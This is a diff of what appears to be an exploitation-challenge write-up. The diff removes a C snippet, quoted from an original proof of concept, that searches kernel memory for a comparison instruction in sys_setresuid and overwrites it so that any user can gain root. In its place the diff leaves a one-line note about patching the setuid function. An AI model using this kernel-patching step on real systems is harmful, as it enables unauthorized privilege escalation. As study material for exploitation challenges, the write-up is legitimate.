@@ -131,24 +131,7 @@ processed 4 bytes
 calling getitimer...
 Segmentation fault
 ```
-now when i have verified i can freely patch anything, ill patch the setuid like in the original POC to be acsses by all
-```c
-the original patch:
-        if (found) {
-            tmp = paddr;
-            tmp += (addr_sym - PAGE_OFFSET) >> 2;
-            for(m = 0; m < 128; m += 4) {
-                if (*(unsigned long *)tmp == 0xe3500000) {
-                    printf("[*] patching sys_setresuid at 0x%08X\n",addr_sym+m);
-                    restore_ptr_setresuid = tmp;
-                    *(unsigned long *)tmp = 0xe3500001;
-                    break;
-                }
-                tmp++;
-            }
-            break;
-        }
-```
+now when i have verified i can freely patch anything, ill patch the setuid function.
 
 ill integrate it to the current challenge: (the address shown is of sys setresuid)
 ```c
